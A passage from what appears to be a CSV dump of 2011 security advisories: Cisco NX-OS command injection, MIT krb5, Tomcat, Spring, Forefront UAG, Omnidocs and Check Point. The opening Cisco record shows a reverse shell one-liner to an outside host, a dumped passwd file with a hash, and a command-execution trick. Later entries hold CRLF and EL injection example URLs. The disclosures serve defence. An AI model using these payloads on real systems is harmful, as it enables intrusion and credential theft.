3) Nexus 4000 ( OS < UNK)
4) Nexus 2000 ( OS < 4.2(1)N2(1) )
5) UCS* ( OS < 1.4(1i) 1.3(1c) )
6) Nexus 1000V ( OS < UNK )
7) MDS ( OS < 5.1(1) )
* On the UCS platform commands injected are executed as root.
As an example:
switch# sh clock | less
Once less is presented we open files by pressing colon and then ""e"" and
specifying the path to the file.
bin:*:1:1:bin:/bin:
daemon:*:2:2:daemon:/usr/sbin:
sys:*:3:3:sys:/dev:
ftp:*:15:14:ftp:/var/ftp:/isanboot/bin/nobash
ftpuser:UvdRSOzORvz9o:99:14:ftpuser:/var/ftp:/isanboot/bin/nobash
nobody:*:65534:65534:nobody:/home:/bin/sh
admin:x:2002:503::/var/home/admin:/isan/bin/vsh_perm
However, this is just read-only access once again. BUT, if we use the ""|""
(pipe) and then ""$"" key macro, we can execute commands.
!ls -lah > /bootflash/20110715
As shown below, the file has been created on the boot-flash.
switch# dir
97 Jul 15 12:01:44 2011 20110715
Using this method, I have been able to establish a remote shell into the
NX-OS Linux subsystem using the following:
mknod rs p; telnet ad.dr.es.s 8888 0<rs | /bin/bash 1>rs
Even the reboot command is accepted as a valid input. However, rather than
rebooting the device, it causes the system to lock while spewing errors
to the console.
switch# sh clock | less
Fri Jul 15 12:06:30 UTC 2011
!reboot
Broadcast message from root (Fri Jul 15 12:06:39 2011):"
11572,MITKRB5-SA-2011-006 KDC denial of service vulnerabilities [CVE-2011-1527 CVE-2011-1528 CVE-2011-1529],,CVE-2011-1527,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2011-006
MIT krb5 Security Advisory 2011-006
Original release: 2011-10-18
Last update: 2011-10-18
Topic: KDC denial of service vulnerabilities
CVE-2011-1527: null pointer dereference in KDC LDAP back end
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:H/RL:OF/RC:C
CVSSv2 Base Score: 7.8
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 6.8
Exploitability: High
Remediation Level: Official Fix
Report Confidence: Confirmed
CVE-2011-1528: assertion failure in multiple KDC back ends
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 7.8
CVSSv2 Temporal Score: 6.1
CVE-2011-1529: null pointer dereference in multiple KDC back ends
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 7.8
CVSSv2 Temporal Score: 6.1
SUMMARY
=======
CVE-2011-1527: In releases krb5-1.9 and later, the KDC can crash due
to a null pointer dereference if configured to use the LDAP back end.
A trigger condition is publicly known but not known to be widely
circulated.
CVE-2011-1528: In releases krb5-1.8 and later, the KDC can crash due
to an assertion failure. No exploit is known to exist, but there is
public evidence that the unidentified trigger condition occurs in the
field.
CVE-2011-1529: In releases krb5-1.8 and later, the KDC can crash due
to a null pointer dereference. No exploit is known to exist.
IMPACT
======
CVE-2011-1527: An unauthenticated remote attacker can crash a KDC
daemon via null pointer dereference if the KDC is configured to use
the LDAP back end. (This is not the default configuration.)
CVE-2011-1528: An unauthenticated remote attacker can crash a KDC
daemon via assertion failure.
CVE-2011-1529: An unauthenticated remote attacker can crash a KDC
daemon via null pointer dereference.
AFFECTED SOFTWARE
=================
* The KDC in krb5-1.9 and later is vulnerable to CVE-2011-1527 when
configured with the LDAP back end. Earlier releases had different
code that masked this bug and did not crash under these conditions.
* The KDC in krb5-1.8 and later is vulnerable to CVE-2011-1528 when
configured with the LDAP back end. When configured with the
Berkeley DB (""db2"") back end, only releases krb5-1.8 through
krb5-1.8.4 are vulnerable.
* The KDC in krb5-1.8 and later is vulnerable to CVE-2011-1529 when
configured with either the Berkeley DB (""db2"") or the LDAP back end.
FIXES
=====
* Workaround: restart the KDC when it crashes, possibly using an
automated monitoring process.
* An upcoming release in the krb5-1.9.x series will fix CVE-2011-1527.
* Upcoming releases in the krb5-1.8.x and krb5-1.9.x series will fix
CVE-2011-1528 and CVE-2011-1529.
* The patch for krb5-1.9.x is available at
http://web.mit.edu/kerberos/advisories/2011-006-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-006-patch.txt.asc
* The patch for krb5-1.8.x is available at
http://web.mit.edu/kerberos/advisories/2011-006-patch-r18.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-006-patch-r18.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2011-006.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2011-1527
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1527
CVE: CVE-2011-1528
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1528
CVE: CVE-2011-1529
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1529
Debian bug #629558:
http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=629558
Ubuntu bug #715579:
https://bugs.launchpad.net/ubuntu/+source/krb5/+bug/715579
ACKNOWLEDGMENTS
===============
CVE-2011-1527: Nalin Dahyabhai and Andrej Ota independently reported
this vulnerability. Kyle Moffett independently reported this bug to
Debian.
CVE-2011-1528: Mark Deneen reported this vulnerability to Ubuntu.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/56CD8F76 2010-12-29 [expires: 2012-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
CVE-2011-1527: null pointer dereference in KDC LDAP back end
Under certain error conditions, krb5_ldap_get_principal() in the KDC
LDAP back end can return success yet leave the client principal entry
as a null pointer. Subsequently executed code attempts to dereference
this null pointer.
CVE-2011-1528: assertion failure in multiple KDC back ends
In the KDC LDAP back end in releases krb5-1.8 and later,
krb5_ldap_lockout_audit() calls assert() with an expression that could
be false under as-yet unidentified conditions. A similar problem
occurs in the KDC Berkeley DB (""db2"") back end in
krb5_db2_lockout_audit() in releases krb5-1.8 through krb5-1.8.4.
(The db2 back end no longer has this assertion in releases krb5-1.9
and later, and is therefore not vulnerable.) There is a report that
the assertion failure occurs in the field, but there is insufficient
information to identify the actual vector.
CVE-2011-1529: null pointer dereference in multiple KDC back ends
In releases krb5-1.8 and later, lookup_lockout_policy() in both the
Berkeley DB (""db2"") and LDAP KDC back ends fails to check that the
principal entry pointer is non-null prior to dereferencing it. This
can happen if an error condition such as KRB5KDC_ERR_PREAUTH_FAILED or
KRB5KRB_AP_ERR_BAD_INTEGRITY occurs in process_as_req() before it
retrieves the principal database entry for the requested client.
REVISION HISTORY
================
2011-10-18 original release
Copyright (C) 2011 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAk6dvtMACgkQSO8fWy4vZo6GowCePb09TB6ml1fQCPgNh+au5RGN
V6sAmwY8e1uEI/PaualYavqA/fAbpCuq
=j6ql
-----END PGP SIGNATURE-----"
11604,SEC Consult SA-20111012-0 :: Client-side remote file upload & command execution in Microsoft Forefront UAG Remote Access Agent (CVE-2011-1969),,CVE-2011-1969,"SEC Consult Vulnerability Lab Security Advisory < 20111012-0 >
=======================================================================
title: Client-side remote file upload & command execution
product: Microsoft Forefront Unified Access Gateway Remote
Access Agent (signed Java applet)
vulnerable version: 4.0.0.1
fixed version:
CVE number: CVE-2011-1969
impact: critical
homepage:
http://www.microsoft.com/en-us/server-cloud/forefront/unified-access-gateway.aspx
found: 2011-04-20
by: Elisabeth Demeter / SEC Consult Vulnerability Lab
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
""Forefront Unified Access Gateway 2010 (UAG) delivers comprehensive,
secure remote access to corporate resources for employees, partners,
and vendors on both managed and unmanaged PCs and mobile devices.
Utilizing a combination of connectivity options, ranging from SSL VPN
to Direct Access, as well as built in configurations and policies,
Forefront UAG provides centralized and easy management of your
organization's complete anywhere access offering.
Integrating a deep understanding of the applications published, the
state of health of the devices being used to gain access, and the
user's identity – Forefront UAG enforces granular access controls and
policies to deliver comprehensive remote access, ensure security, and
reduce management costs and complexity.""
http://www.microsoft.com/en-us/server-cloud/forefront/unified-access-gateway.aspx
Vulnerability overview/description:
-----------------------------------
The client-side endpoint security solution (Microsoft Forefront UAG),
e.g. supplied by Microsoft Outlook Web App, uses either a signed Java
applet (Remote Access Agent) or an ActiveX Control (Endpoint
Components) to connect to a VPN and perform local compliance scans on
the client.
Due to quality issues within the software, an attacker is able to access
insecure methods from the ""trustworthy"" Java applet and exploit those
features to compromise all client systems that trust the correctly
signed Java applet (e.g. all users that need to use this software for
accessing internal systems over company VPN).
The ActiveX control has the same functionality, which is why it is
strongly presumed that a similar attack is possible.
Microsoft UAG Remote Access Agent contains the MicrosoftClient.jar
which in turn contains AgentAppletDriver.java. This class creates an
""Agent"" object that writes one of the following three files to the
client system (depending on the operating system):
* agent_win_helper.jar
* agent_mac_helper.jar
* agent_lin_helper.jar
It is only checked if the jar is signed, but not who signed it, so any
created self-signed jar that is named like one of these files can be
used. The manipulated jar files can only be loaded if the codebase is
completely on the attacker system (the MicrosoftClient.jar and all the
other needed files need to be on the attacker system).
The agent_xxx_helper.jar needs to include any executable with the name
""ProxyProcess_Win.exe"" and/or ""AttachmentWiper.exe"" which is executed
during the doInit() function which in turn is called during the init()
function of AgentAppletDriver.java.
==>>
Summing up, an attacker is able to upload arbitrary executable files to
remote clients and then immediately execute them without notice as a
signed Java applet is being used (if ""Always trust content from this
publisher"" has been checked - otherwise an unsuspicious Java digital
signature verification popup will occur).
Possible attack vectors are drive-by downloads just by visiting
malicious websites but also through emails, any XSS on unsuspicous
websites, etc.
Proof of concept:
-----------------
The exploit will not be published, but a video demonstrating this issue
has been created. It can be found at the following URL:
https://www.sec-consult.com/files/111012_microsoft_forefront_exploit.mp4
Vulnerable / tested versions:
-----------------------------
The Forefront UAG Remote Access Agent 4.0.0.1 has been tested and
successfully exploited.
Vulnerable signed Java applet certificate SHA1 fingerprint:
9E:97:2B:4B:22:51:E2:BE:87:AA:C5:2C:2F:1D:88:7B:94:BD:51:EA
According to Microsoft, the following systems are vulnerable:
- Microsoft Forefront Unified Access Gateway 2010
- Microsoft Forefront Unified Access Gateway 2010 Update 1
- Microsoft Forefront Unified Access Gateway 2010 Update 2
- Microsoft Forefront Unified Access Gateway 2010 Service Pack 1
Vendor contact timeline:
------------------------
2011-04-22: Contacted vendor through secure microsoft com
2011-04-22: Vendor: Very fast response, issue is being investigated:
MSRC case 11257
2011-04-28: Contacted vendor asking for updates
2011-05-17: Contacted vendor again asking for updates
2011-05-19: Contacted personal contact at MSRC asking for updates
2011-05-19: Answer from personal contact and from case manager: they
could reproduce the issue and are currently working on a fix
timeline, fix expected in the next few months
2011-05-30: Contacted vendor informing about our publishing schedule:
minimal information will be published on June 13th, mutual
customers will be informed in more detail, advisory and
video will be published when issue is fixed
2011-05-31: Answer from vendor to postpone the publishing date
2011-06-06: Proposal to the vendor to postpone the publishing date to
July 12th
2011-06-06: Answer from vendor ok-ing it
2011-06-22: Update from vendor to postpone the publishing date again
2011-06-23: Update from vendor with more information about the fixing
schedule
2011-06-28: Contacted vendor accepting a possible postponing of the
July 12th publishing date, also offering dates for a
phone-conference call
2011-06-28: Answer from vendor about dates for phone-conference call
2011-06-29: New offering of dates for phone-conference call
2011-07-13: Conference call
2011-08-21: Contacted vendor about updates
2011-08-22: Update from third party will be in october, so patch from
vendor will also be in october
2011-09-26: Contacted vendor about specific publishing dates
2011-09-26: Publishing dates confirmed by vendor for October 11th
We thank the people from Microsoft for their cooperation!
Solution:
---------
Update your Microsoft Forefront UAG.
Workaround:
-----------
Deactivate Java in your browser. Login to Microsoft Outlook Web App
should still be possible.
Add the entry for the following file:
Javajre6libsecuritylacklist
# UAG Client MicrosoftClient.jar
SHA1-Digest-Manifest: dBKbNW1PZSjJ0lGcCeewcCrYx5g=
Remove the affected trusted certificate (see fingerprint above) of
Microsoft Corporation from the Java control panel (jcontrol) from all
clients.
Don't fully trust signed Java applets (in general).
This workaround can be applied to MAC, Linux, and Windows systems by
modifying the appropriate blacklist file on each system.
If the VPN functionality (or any other) is absolutely needed, only
""trust"" it on the company site (don't store the certificate forever and
verify each connect) and don't click on it when the Java certificate
popup occurs on other web pages.
Advisory URL:
-------------
https://www.sec-consult.com/en/advisories.html
http://technet.microsoft.com/en-us/security/bulletin/ms11-079
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC Consult Unternehmensberatung GmbH
Office Vienna
Mooslackengasse 17
A-1190 Vienna
Austria
Tel.: +43 / 1 / 890 30 43 - 0
Fax.: +43 / 1 / 890 30 43 - 25
Mail: research at sec-consult dot com
https://www.sec-consult.com
EOF E. Demeter / 2011"
11725,[SECURITY] CVE-2011-1184 Apache Tomcat - Multiple weaknesses in HTTP DIGEST authentication,,CVE-2011-1184,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2011-1184 Apache Tomcat - Multiple weaknesses in HTTP DIGEST
authentication
Severity: Moderate
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.11
- - Tomcat 6.0.0 to 6.0.32
- - Tomcat 5.5.0 to 5.5.33
- - Earlier, unsupported versions may also be affected
Description:
The implementation of HTTP DIGEST authentication was discovered to
have several weaknesses:
- - replay attacks were permitted
- - server nonces were not checked
- - client nonce counts were not checked
- - qop values were not checked
- - realm values were not checked
- - the server secret was hard-coded to a known string
The result of these weaknesses is that DIGEST authentication was only
as secure as BASIC authentication.
Mitigation:
Users of Tomcat 7.0.x should upgrade to 7.0.12 or later
Users of Tomcat 6.0.x should upgrade to 6.0.33 or later
Users of Tomcat 5.5.x should upgrade to 5.5.34 or later
Credit:
This issue was identified by the Apache Tomcat security team
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJOgF0tAAoJEBDAHFovYFnnv70QALdoVwivDt9bXBEpMgjJ0/NY
kadCFsA/X+O8TEKTRx/85B54Spgv8dGJFiPMettdbfjFuq7ADsRiAbxsZQ3dEIfJ
esrWfPJRTpXhjKU1OOLmoDvoueAD0pD7/qvl8o9bFowxGXLWqvO/elFe+4AH2YjZ
ux9tWOlWn46Q7ffaNOzRebjPVIQ3ebB+FH9ToZAdNfFFIZbtxYRMV02wRfHWq+fU
kTJ+hKF0XOpzyIut3zkmE00ZuvGAPLdnZcMKq9m/X/dt/niP2nT8H28Xx1Zu8sW+
CUE7CRse4pI6fGuXVrOAk1akyN/hkiSPxDNsDnHxALTNmjr1Z+DAs7QT5IKc3EDv
NeSXAnxKfIJ83jcjam1bEf38UN1uYatP/u6XJCVpnOr0UjJ9wtO+QgSV/93eiyD7
YCpVcmKay/jvWmLPp7MRB+h6FGhJNw5OA5k7IWJePBXC39p6tpac3vsOKx1OGU38
QKUglIro/TtZo7gmfeG8lD3lI493l25+3E/vBiSrbfSHua3bmyFQikQMhy2ZPYIt
4wEfdaW4hUBJHpxkDaotuTTN8ATzQLtDNTGei2u76ZXQiOjTLUDGam++6fR+kfZU
gloAy8ZIS702hoXg/ypFPtcyIx435dOgxtGIbOedmDUsy1ErGTCAksrOyn2yZl3v
+Ew0bAULNmXwKQeMyDj0
=u/Ai
-----END PGP SIGNATURE-----"
11726,[CVE-2011-3645] Multiple vulnerability in Newgen's Omnidocs,,CVE-2011-3645,"Exploit Title: Multiple Vulnerability in ""Omnidocs""
Author: Sohil Garg
CVE : CVE-2011-3645
Product Description:
OmniDocs is an Enterprise Document Management (EDM) platform for creating, capturing, managing, delivering and archiving large volumes of documents and
contents. Also integrates seamlessly with other enterprise applications.
Vulnerability Details:
1.Vulnerbility Type
Privilege escalation
Affected URL:
http://serverIP/omnidocs/doccab/doclist.jsp?DocListFolderId=927964&FolderType=G&FolderRights=010000000&FolderName=1234&FolderOwner=test&FolderLocation=G&Fold
erAccessType=I&ParentFolderIndex=100&FolderPathFlag=Y&Fetch=5&VolIndex=1&VolIndex=1
Vulnerable Parameter:
FolderRights
Exploit
Omnidocs application does not validate 'FolderRights' parameter. This parameter could be modified to '111111111' to get full access including rights to add
documents, add folders, delete folders and place orders.
2.Vulnerability Type
Direct Object Access
Sample URL:
http://serverIP/omnidocs/doccab/userprofile/editprofile.jsp
Vulnerable Parameter:
UserIndex
Exploit:
Omnidocs application does not validate 'UserIndex' parameter. 'UserIndex' parameter is used to access the personal setting page. This parameter can be
changed to other valid numbers thereby gaining access to view or change other user's personal settings.
Timeline:
Notified Vendor: 01-Sep-2011
No response received from vendor for 3 weeks
Public Disclosure: 23-Sep-2011
Greetz to:
1] Nikhil Mittal"
11791,CVE-2011-2731: Spring Security privilege escalation when using RunAsManager,,CVE-2011-2731,"CVE-2011-2731: Spring Security privilege escalation when using RunAsManager
Severity: Moderate
Versions Affected:
2.0.0 to 2.0.6
3.0.0 to 3.0.5
Earlier versions may also be affected
Description:
Spring Security provides a mechanism (RunAsManager) to allow particular operations to run with a different set of privileges than the predefined user. The implementation contains a race condition whereby the escalated privileges could also be used in a different invocation in another thread.
Example:
If the RunAsManager returns an Authentication object for the current invocation, the security interceptor will temporarily store this in the security context for the duration of the invocation. This authentication object would be shared with other concurrently executing threads, leading to a possible escalation of privileges in those threads.
Mitigation:
If you are not using a RunAsManager implementation, then you are not affected by this issue.
All users may mitigate this issue by upgrading to 3.0.6
Users of 2.0.x may upgrade to 2.0.7
Fix:
This issue was fixed by ensuring that the a new thread-local security context is created during run-as replacement and the temporary authentication token copied to it.
Credit:
The issue was discovered by Rob Winch.
History:
2011-09-09: Original advisory
References:
[1] http://www.springsource.com/security/cve-2011-2731"
11792,CVE-2011-2894: Spring Framework and Spring Security serialization-based remoting vulnerabilities,,CVE-2011-2894,"CVE-2011-2894: Spring Framework and Spring Security serialization-based remoting vulnerabilities
Severity: Critical
Versions Affected:
Spring Framework:
3.0.0 to 3.0.5
Spring Security:
2.0.0 to 2.0.6
3.0.0 to 3.0.5
Earlier versions may also be affected
Description:
Several issues have been reported which may affect applications which de-serialize objects from an untrusted source such as a remote client. It is possible for a malicious client to inject undesirable behaviour into the server by serializing proxies rather than specific class instances, or by taking advantage of internal AOP interfaces which were being exposed through the remote service, in addition to the service interface.
Example:
It is possible to serialize a sub-classed DefaultListableBeanFactory instance from the client to the server and use it to execute chosen commands on the server, using the ""java.lang.Runtime"" class. The attack can be executed by serializing a java.lang.Proxy instance in combination with an InvocationHandler or by injecting the exploit as a substitute target source through the exposed org.springframework.aop.framework.Advised interface of an exported remote service.
Spring Security's remoting allows an authentication token (an implementation of the Authentication interface) to be passed from the client, which is authenticated on the server. By crafting a proxy instance, it is possible to circumvent the server-side checking of the submitted token.
Mitigation:
Applications which use serialization-based remoting are likely to be vulnerable. In the long-term, we would recommend users migrate away from serialization-based remoting in cases where the client cannot be trusted, as it is a potential source of vulnerabilities in both Spring and non-Spring applications.
All users may mitigate this issue by upgrading to Spring Framework 3.0.6 and Spring Security 3.0.6. Spring Framework users should make use of the additional features introduced to prevent deserialization of malicious proxies. These are described below.
Users of Spring Security 2.0.x may upgrade to 2.0.7
Fix:
RemoteInvocationSerializingExporter (the base class for HttpInvokerServiceExporter) now has an ""acceptProxyClasses"" flag which should be set to false if using Spring remoting. This will prevent any deserialization of proxies through Spring remoting, thus providing additional protection against future attacks of this kind which may use other serializable classes.
DefaultListableBeanFactory instances can no longer be deserialized other than through a SerializedBeanFactoryReference, which resolves to an existing bean factory instance on the server side. In addition, the serialization ID can be customized, to prevent a client from guessing it, by setting a value for ""contextId"" in the web.xml file as a context-param and as an init-param for instances of FrameworkServlet (such as Spring's DispatcherServlet).
RemoteExporter now uses an ""opaque"" proxy to limit exported methods to those of the service interface. This prevent access to interfaces such as org.springframework.aop.framework.Advised.
Spring Security remoting has been changed to prevent the submission of an Authentication instance by a remote client. It now only supports username/password authentication. This removes any possibility of an untrusted Authentication object being created on the server and prevents any of the associated attack vectors.
Credit:
The issue was discovered by Wouter Coekaerts (http://wouter.coekaerts.be/).
History:
2011-09-09: Original advisory
References:
[1] http://www.springsource.com/security/cve-2011-2731"
11793,CVE-2011-2732: Spring Security header injection vulnerability,,CVE-2011-2732,"CVE-2011-2732: Spring Security header injection vulnerability
Severity: Important
Versions Affected:
2.0.0 to 2.0.6
3.0.0 to 3.0.5
Earlier versions may also be affected
Description:
Spring Security allows the use of a parameter (named ""spring-security-redirect"" by default) to determine the location URL to which a user will be redirected after logging in. This will normally be submitted as part of the login request, so is deemed to be an acceptable use of remote supplied data. However, the functionality is in a base class which is also shared by logout code, so a logout URL could be maliciously constructed to contain a version of this parameter which contained CRLF characters in order to inject additional headers or split the response.
Example:
A logout link such as
/mywebapp/logout/spring-security-redirect=%0d%0a%20NewHeader%3ainjectedValue
could be used to inject the header
NewHeader:InjectedValue
to the response
Mitigation:
Anyone using Spring Security's default logout handling support may be vulnerable, unless they are using a custom LogoutSuccessHandler which does not support this parameter.
All users may mitigate this issue by upgrading to 3.0.6
Users of 2.0.x may upgrade to 2.0.7
Fix:
Support for the use of the parameter has been disabled by default for logout handling in 3.0.6. A default response wrapper has also been used which will raise an exception if the value passed to HttpResponse.sendRedirect contains CR or LF characters.
Credit:
The issue was discovered by David Mas.
History:
2011-09-09: Original advisory
References:
[1] http://www.springsource.com/security/cve-2011-2732"
11794,CVE-2011-2730: Spring Framework Information Disclosure,,CVE-2011-2730,"CVE-2011-2730: Spring Framework Information Disclosure
Severity: Variable depending on application. Likely to be low to moderate, may be important.
Version affected:
3.0.0 to 3.0.5
2.5.0 to 2.5.6.SEC02 (community releases)
2.5.0 to 2.5.7.SR01 (subscription customers)
Earlier, unsupported versions may also be affected
Description:
Prior to JSP 2.0, Expression Language (EL) was not supported. To enable the use of EL in web applications based on earlier JSP specifications, some Spring MVC tags provide EL support independently of the Servlet/JSP container. The evaluation of EL is enabled by default. When used on containers that do support EL, the attributes can be evaluated for EL twice. Once by the container and once by the tag. This can lead to unexpected results that include disclosure of information. More details, including a complete list of the vulnerable tags and attributes, are available in a paper[1] written by the researchers that discovered this issue.
Example:
A request of the form:
http:///vulnerable.com/foo?message=${applicationScope}
to a page that contains:
<spring:message code=""${param['message']}"" text=""""/>
will result in output that contains internal server information including the classpath and local working directories. Session IDs can be obtained using similar techniques.
Mitigation:
A new context parameter has been added called springJspExpressionSupport. When true (the default) the existing behaviour of evaluating EL within the tag will be performed. When running in an environment where EL support is provided by the container, this should be set to false. Note that for Spring Framework 3.1 onwards when running on a Servlet 3.0 or higher container, the correct default will be set automatically. This new attribute is available in:
3.0.6 onwards
2.5.6.SEC03 onwards (community releases)
2.5.7.SR02 (subscription customers)
Credit:
This issue was discovered by Stefano Di Paola, Minded Security and Arshan Dabirsiaghi, Aspect Security.
History:
2011-09-09: Original advisory
References:
[1] http://bit.ly/ExpressionLanguageInjection
[2] http://www.springsource.com/security/cve-2011-2730"
11864,[SECURITY] CVE-2011-3190 Apache Tomcat Authentication bypass and information disclosure,,CVE-2011-3190,"CVE-2011-3190 Apache Tomcat Authentication bypass and information disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Tomcat 7.0.0 to 7.0.20
- Tomcat 6.0.0 to 6.0.33
- Tomcat 5.5.0 to 5.5.33
- Earlier, unsupported versions may also be affected
Description:
Apache Tomcat supports the AJP protocol which is used with reverse
proxies to pass requests and associated data about the request from the
reverse proxy to Tomcat. The AJP protocol is designed so that when a
request includes a request body, an unsolicited AJP message is sent to
Tomcat that includes the first part (or possibly all) of the request
body. In certain circumstances, Tomcat did not process this message as a
request body but as a new request. This permitted an attacker to have
full control over the AJP message which allowed an attacker to (amongst
other things):
- insert the name of an authenticated user
- insert any client IP address (potentially bypassing any client IP
address filtering)
- trigger the mixing of responses between users
The following AJP connector implementations are not affected:
org.apache.jk.server.JkCoyoteHandler (5.5.x - default, 6.0.x - default)
The following AJP connector implementations are affected:
org.apache.coyote.ajp.AjpProtocol (6.0.x, 7.0.x - default)
org.apache.coyote.ajp.AjpNioProtocol (7.0.x)
org.apache.coyote.ajp.AjpAprProtocol (5.5.x, 6.0.x, 7.0.x)
Further, this issue only applies if all of the following are are true
for at least one resource:
- POST requests are accepted
- The request body is not processed
Example: See https://issues.apache.org/bugzilla/show_bug.cgi?id=51698
Mitigation:
Users of affected versions should apply one of the following mitigations:
- Upgrade to a version of Apache Tomcat that includes a fix for this
issue when available
- Apply the appropriate patch
- 7.0.x http://svn.apache.org/viewvc?rev=1162958&view=rev
- 6.0.x http://svn.apache.org/viewvc?rev=1162959&view=rev
- 5.5.x http://svn.apache.org/viewvc?rev=1162960&view=rev
- Configure the reverse proxy and Tomcat's AJP connector(s) to use the
requiredSecret attribute
- Use the org.apache.jk.server.JkCoyoteHandler AJP connector (not
available for Tomcat 7.0.x)
Credit:
The issue was reported via Apache Tomcat's public issue tracker.
The Apache Tomcat security team strongly discourages reporting of
undisclosed vulnerabilities via public channels. All Apache Tomcat
security vulnerabilities should be reported to the private security team
mailing list: security tomcat apache org
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html
https://issues.apache.org/bugzilla/show_bug.cgi?id=51698"
11986,[SECURITY] CVE-2011-2481: Apache Tomcat information disclosure vulnerability,,CVE-2011-2481,"CVE-2011-2481: Apache Tomcat information disclosure vulnerability
Severity: low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 7.0.0 to 7.0.16
Previous versions are not affected.
Description:
The re-factoring of XML validation for Tomcat 7.0.x re-introduced the
vulnerability previously reported as CVE-2009-0783. This was initially
reported as a memory leak
(https://issues.apache.org/bugzilla/show_bug.cgi?id=51395). If a web
application is the first web
application loaded, this bug allows that web application to potentially
view and/or alter the web.xml, context.xml and tld files of other web
applications deployed on the Tomcat instance.
Mitigation:
7.0.x users should upgrade to 7.0.17 or later
Example:
See https://issues.apache.org/bugzilla/show_bug.cgi?id=29936#c12 for an
example web application that can be used to replace the XML parser used
by Tomcat.
Credit:
The security implications of bug 51395 were identified by the Tomcat
security team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
The Apache Tomcat Security Team"
11987,[SECURITY] CVE-2011-2729: Commons Daemon fails to drop capabilities (Apache Tomcat),,CVE-2011-2729,"CVE-2011-2729: Commons Daemon fails to drop capabilities (Apache Tomcat)
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 7.0.0 to 7.0.19
Tomcat 6.0.30 to 6.0.32
Tomcat 5.5.32 to 5.5.33
Description:
Due to a bug in the capabilities code, jsvc (the service wrapper for
Linux that is part of the Commons Daemon project) does not drop
capabilities allowing the application to access files and directories
owned by superuser. This vulnerability only applies if:
a) Tomcat is running on a Linux operating system
b) jsvc was compiled with libcap
c) -user parameter is used
The Tomcat versions above shipped with source files for jsvc that
included this vulnerability.
Mitigation:
Affected users of all versions can mitigate these vulnerabilities by
taking any of the following actions:
a) upgrade to jsvc 1.0.7 or later
b) do not use -user parameter to switch user
c) recompile the jsvc without libcap support
Updated jsvc source is included in Apache Tomcat 7.0.20 and will be
included in the next releases of Tomcat 6.0.x and 5.5.x. Updated source
can be obtained from the Apache Commons Daemon project.
Credit:
This issue was identified by Wilfried Weissmann."
11991,CVE-2011-0527: VMware vFabric tc Server password obfuscation bypass,,CVE-2011-0527,"Severity: Important
Versions Affected:
2.0.0.RELEASE to 2.0.5.SR01
2.1.0.RELEASE to 2.1.1.SR01
Description:
tc Server allows users to store the passwords used for JMX authentication in an obfuscated form for organizations where storing passwords in plain text is not permitted. The JMX authentication implementation was incorrectly allowing users to authenticate using the password in either its plain text form or its obfuscated form, bypassing the benefit of obfuscation.
Mitigation:
If you are not using password obfuscation, then you are not affected by this issue.
Users of 2.0.x may mitigate this issue by upgrading to 2.0.6.RELEASE.
Users of 2.1.x may mitigate this issue by upgrading to 2.1.2.RELEASE.
Users of 2.5.x are not affected.
Credit:
The issue was reported by the SpringSource tc Server support team.
History
2011-08-11: Original Advisory"
11993,SEC Consult SA-20110810-0 :: Client-side remote file upload & command execution in Check Point SSL VPN On-Demand applications - CVE-2011-1827,,CVE-2011-1827,"SEC Consult Vulnerability Lab Security Advisory < 20110810-0 >
=======================================================================
title: Client-side remote file upload & command execution
product: Check Point SSL VPN On-Demand applications (signed
Java applet and ActiveX control)
* SSL Network Extender (SNX)
* SecureWorkSpace
* Endpoint Security On-Demand
supplied by Check Point Connectra or other security
gateways
vulnerable version: multiple products, see sections below
fixed version: multiple products, see sections below
CVE number: CVE-2011-1827
impact: critical
homepage: http://www.checkpoint.com
found: 2011-03-28
by: Johannes Greil / SEC Consult Vulnerability Lab
https://www.sec-consult.com
=======================================================================
Vendor/product description:
---------------------------
""SSL Network Extender (SNX) is a browser plug-in that provides
clientless remote access, while delivering full network connectivity
for any IP-based application.""
URL: http://www.checkpoint.com/products/ssl_network_ext/
""Comprehensive Endpoint Security
Scans for spyware to ensure that malicious processes, keystroke
